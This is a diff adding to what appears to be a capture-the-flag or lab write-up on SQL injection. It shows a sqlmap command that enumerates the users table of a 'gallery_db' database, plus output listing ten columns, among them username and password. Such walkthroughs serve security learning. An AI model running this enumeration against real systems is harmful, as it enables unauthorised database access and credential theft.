@@ -182,3 +182,25 @@ Database: gallery_db
 Looking at the list, users is the table that I want to start pulling data from. I'll wager that I don't need most of the columns for this table. I am going to get the columns for the users table by running the following command:
 
 `sqlmap -r request.txt -D gallery_db -T users --columns`
+
+This produces the following output:
+
+```bash
+Database: gallery_db
+Table: users
+[10 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| id           | int(50)      |
+| password     | text         |
+| type         | tinyint(1)   |
+| avatar       | text         |
+| date_added   | datetime     |
+| date_updated | datetime     |
+| firstname    | varchar(250) |
+| last_login   | datetime     |
+| lastname     | varchar(250) |
+| username     | text         |
++--------------+--------------+
+```
